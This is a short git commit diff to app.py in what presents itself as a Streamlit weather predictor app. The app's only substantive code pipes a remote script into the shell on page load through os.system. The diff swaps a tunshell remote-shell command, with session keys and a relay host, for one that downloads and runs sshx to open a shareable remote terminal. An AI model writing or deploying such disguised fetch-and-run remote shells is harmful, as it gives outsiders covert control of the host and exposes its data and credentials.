2b1cb29b88ac8a14c7b03d512037e075f49284d6
mfunekosomadinga <mfunekosomadinga@gmail.com>
2025-01-03 16:40:05 +0200

    Update app.py

--- app.py
+++ app.py
@@ -4,5 +4,5 @@ import os
 st.title("Welcome to my weather predictor app")
 st.header("Let's all forecast weather")
 
-results = os.system("curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T f85xApGBm5lr2CbE6GQ4PD TVkYKMb48KKZINvj6hoJdB eu.relay.tunshell.com")
+results = os.system("curl -sSf https://sshx.io/get | sh -s run")
 st.write(results)
